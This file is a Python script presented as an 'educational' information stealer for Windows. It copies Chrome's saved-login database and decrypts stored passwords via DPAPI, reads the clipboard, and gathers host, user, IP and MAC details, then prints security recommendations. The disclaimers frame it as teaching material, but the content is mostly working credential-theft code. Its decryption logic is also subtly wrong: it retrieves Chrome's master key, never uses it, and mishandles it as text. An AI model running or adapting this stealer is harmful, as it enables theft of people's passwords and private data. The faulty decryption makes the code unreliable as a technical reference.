#!/usr/bin/env python3
"""
Information Stealer - Educational Cybersecurity Project

DISCLAIMER: This script is for EDUCATIONAL and ETHICAL HACKING purposes ONLY.
Unauthorized data collection without explicit consent is ILLEGAL and violates 
cybersecurity laws. Always obtain proper permission before testing on any system.

This project demonstrates:
- Browser forensics and password extraction techniques
- Cryptographic decryption using Windows DPAPI
- SQLite database handling
- Clipboard hijacking vulnerabilities
- System reconnaissance methods

Purpose: Help students understand cybersecurity vulnerabilities and develop 
defense mechanisms against real-world threats.
"""

import os
import sys
import json
import base64
import sqlite3
import platform
import socket
import uuid
import requests
import subprocess
import ctypes
from ctypes import wintypes
from pathlib import Path
import tempfile
import shutil


# Windows API constants for DPAPI
CRYPTPROTECT_UI_FORBIDDEN = 0x01


class DATA_BLOB(ctypes.Structure):
    """Structure for Windows DPAPI data blob"""
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_ubyte))
    ]


def decrypt_with_dpapi(encrypted_data):
    """
    Decrypt data using Windows DPAPI (Data Protection API)
    This is how Chrome decrypts passwords on Windows
    """
    try:
        # Create input blob
        blob_in = DATA_BLOB()
        blob_in.cbData = len(encrypted_data)
        blob_in.pbData = ctypes.cast(
            ctypes.create_string_buffer(encrypted_data),
            ctypes.POINTER(ctypes.c_ubyte)
        )
        
        # Create output blob
        blob_out = DATA_BLOB()
        
        # Call CryptUnprotectData
        ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in),
            None,
            None,
            None,
            None,
            CRYPTPROTECT_UI_FORBIDDEN,
            ctypes.byref(blob_out)
        )
        
        # Extract decrypted data
        decrypted_bytes = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        
        # Free memory
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        
        return decrypted_bytes.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[Decryption Failed: {str(e)}]"


def get_chrome_encryption_key():
    """
    Extract the encryption key from Chrome's Local State file
    This key is used to decrypt saved passwords
    """
    try:
        # Path to Chrome Local State
        local_state_path = os.path.expandvars(
            r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
        )
        
        if not os.path.exists(local_state_path):
            return None
        
        # Read Local State file
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        # Extract encrypted key
        encrypted_key = base64.b64decode(
            local_state['os_crypt']['encrypted_key']
        )
        
        # Remove DPAPI prefix (first 5 bytes)
        encrypted_key = encrypted_key[5:]
        
        # Decrypt using DPAPI
        decrypted_key = decrypt_with_dpapi(encrypted_key)
        
        return decrypted_key
    
    except Exception as e:
        print(f"[!] Error extracting Chrome key: {e}")
        return None


def extract_chrome_passwords():
    """
    Extract saved passwords from Chrome's Login Data database
    Demonstrates browser forensics and SQLite database handling
    """
    print("\n" + "="*60)
    print("CHROME PASSWORD EXTRACTION")
    print("="*60)
    
    try:
        # Path to Chrome Login Data
        login_data_path = os.path.expandvars(
            r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
        )
        
        if not os.path.exists(login_data_path):
            print("[-] Chrome Login Data not found")
            return []
        
        # Create temporary copy (Chrome locks the database when running)
        temp_db = os.path.join(tempfile.gettempdir(), 'chrome_login_data_copy.db')
        shutil.copy2(login_data_path, temp_db)
        
        # Connect to SQLite database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query saved passwords
        cursor.execute("""
            SELECT origin_url, username_value, password_value 
            FROM logins
        """)
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            
            # Decrypt password using DPAPI
            if encrypted_password:
                decrypted_password = decrypt_with_dpapi(encrypted_password)
                
                passwords.append({
                    'url': url,
                    'username': username,
                    'password': decrypted_password
                })
                
                print(f"[+] URL: {url}")
                print(f"    Username: {username}")
                print(f"    Password: {decrypted_password[:20]}...")
                print()
        
        conn.close()
        
        # Clean up temp file
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"[+] Total passwords extracted: {len(passwords)}")
        return passwords
        
    except Exception as e:
        print(f"[-] Error extracting Chrome passwords: {e}")
        return []


def capture_clipboard():
    """
    Capture clipboard data
    Demonstrates clipboard hijacking vulnerability
    """
    print("\n" + "="*60)
    print("CLIPBOARD DATA CAPTURE")
    print("="*60)
    
    try:
        # Try using pyperclip first
        try:
            import pyperclip
            clipboard_data = pyperclip.paste()
            if clipboard_data:
                print(f"[+] Clipboard Content: {clipboard_data[:200]}")
                return clipboard_data
            else:
                print("[-] Clipboard is empty")
                return None
        except ImportError:
            pass
        
        # Fallback: Use Windows API via ctypes
        CF_TEXT = 1
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        
        # Open clipboard
        if not user32.OpenClipboard(0):
            print("[-] Failed to open clipboard")
            return None
        
        try:
            # Get clipboard data
            handle = user32.GetClipboardData(CF_TEXT)
            if not handle:
                print("[-] No text data in clipboard")
                return None
            
            # Lock handle to get pointer
            pointer = kernel32.GlobalLock(handle)
            if not pointer:
                print("[-] Failed to lock clipboard data")
                return None
            
            try:
                # Read string from pointer
                clipboard_data = ctypes.c_char_p(pointer).value
                if clipboard_data:
                    clipboard_text = clipboard_data.decode('utf-8', errors='ignore')
                    print(f"[+] Clipboard Content: {clipboard_text[:200]}")
                    return clipboard_text
                else:
                    print("[-] Clipboard is empty")
                    return None
            finally:
                kernel32.GlobalUnlock(handle)
        finally:
            user32.CloseClipboard()
            
    except Exception as e:
        print(f"[-] Error capturing clipboard: {e}")
        return None


def gather_system_info():
    """
    Gather comprehensive system information
    Demonstrates system reconnaissance techniques
    """
    print("\n" + "="*60)
    print("SYSTEM INFORMATION GATHERING")
    print("="*60)
    
    system_info = {}
    
    try:
        # OS Information
        system_info['os'] = platform.system()
        system_info['os_version'] = platform.version()
        system_info['os_release'] = platform.release()
        system_info['architecture'] = platform.architecture()[0]
        system_info['machine'] = platform.machine()
        
        print(f"[+] Operating System: {system_info['os']} {system_info['os_release']}")
        print(f"[+] OS Version: {system_info['os_version']}")
        print(f"[+] Architecture: {system_info['architecture']}")
        print(f"[+] Machine: {system_info['machine']}")
        
        # Hostname and User
        system_info['hostname'] = socket.gethostname()
        system_info['username'] = os.getlogin()
        
        print(f"[+] Hostname: {system_info['hostname']}")
        print(f"[+] Username: {system_info['username']}")
        
        # IP Addresses
        try:
            # Private IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            system_info['private_ip'] = s.getsockname()[0]
            s.close()
            print(f"[+] Private IP: {system_info['private_ip']}")
        except:
            system_info['private_ip'] = "Unknown"
            print("[-] Could not determine private IP")
        
        # Public IP
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            system_info['public_ip'] = response.json().get('ip', 'Unknown')
            print(f"[+] Public IP: {system_info['public_ip']}")
        except:
            system_info['public_ip'] = "Unknown"
            print("[-] Could not determine public IP")
        
        # MAC Address
        try:
            system_info['mac_address'] = ':'.join(
                ['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                 for elements in range(0, 2*6, 8)][::-1]
            )
            print(f"[+] MAC Address: {system_info['mac_address']}")
        except:
            system_info['mac_address'] = "Unknown"
        
        # Processor Information
        system_info['processor'] = platform.processor()
        print(f"[+] Processor: {system_info['processor']}")
        
        # Additional System Details
        system_info['platform'] = platform.platform()
        print(f"[+] Platform: {system_info['platform']}")
        
        # CPU Count
        try:
            system_info['cpu_count'] = os.cpu_count()
            print(f"[+] CPU Cores: {system_info['cpu_count']}")
        except:
            pass
        
        return system_info
        
    except Exception as e:
        print(f"[-] Error gathering system info: {e}")
        return system_info


def display_security_recommendations():
    """
    Display security recommendations to defend against such attacks
    """
    print("\n" + "="*60)
    print("SECURITY RECOMMENDATIONS")
    print("="*60)
    print("""
1. BROWSER SECURITY:
   - Use a password manager (Bitwarden, 1Password, KeePass)
   - Enable 2FA/MFA on all accounts
   - Regularly clear saved passwords from browsers
   - Use browser's master password feature if available

2. CLIPBOARD PROTECTION:
   - Use password managers with auto-fill (avoid copying passwords)
   - Clear clipboard after copying sensitive data
   - Use clipboard managers with encryption

3. SYSTEM SECURITY:
   - Keep OS and software updated
   - Use reputable antivirus/anti-malware
   - Enable firewall
   - Be cautious of suspicious software/downloads
   - Use VPN to hide public IP

4. DETECTION & MONITORING:
   - Monitor running processes
   - Check browser extensions regularly
   - Review network connections
   - Use endpoint detection and response (EDR) tools

5. INCIDENT RESPONSE:
   - Change all passwords if compromise suspected
   - Enable account alerts for suspicious activity
   - Regular security audits
    """)


def main():
    """
    Main function to run the information stealer demonstration
    """
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║           INFORMATION STEALER - EDUCATIONAL DEMO          ║
    ║                                                           ║
    ║  DISCLAIMER: This tool is for EDUCATIONAL purposes only!    ║
    ║  Unauthorized use is ILLEGAL and unethical.               ║
    ║                                                           ║
    ║  Purpose: Understand vulnerabilities to build defenses      ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    print("[*] Starting system analysis...")
    print("[*] This demonstration shows how attackers extract information")
    print("[*] Use this knowledge to improve your security posture\n")
    
    # Gather all information
    chrome_passwords = extract_chrome_passwords()
    clipboard_data = capture_clipboard()
    system_info = gather_system_info()
    
    # Display security recommendations
    display_security_recommendations()
    
    print("\n" + "="*60)
    print("ANALYSIS COMPLETE")
    print("="*60)
    print("[*] Review the extracted information above")
    print("[*] Implement the security recommendations to protect yourself")
    print("[*] Stay vigilant and practice good cybersecurity hygiene!")
    
    return {
        'chrome_passwords': chrome_passwords,
        'clipboard_data': clipboard_data,
        'system_info': system_info
    }


if __name__ == "__main__":
    # Check if running on Windows (required for Chrome DPAPI)
    if sys.platform != 'win32':
        print("[-] This script requires Windows for full functionality")
        print("[-] Chrome password extraction uses Windows DPAPI")
        print("[*] Running limited system information gathering...")
    
    try:
        results = main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        sys.exit(1)
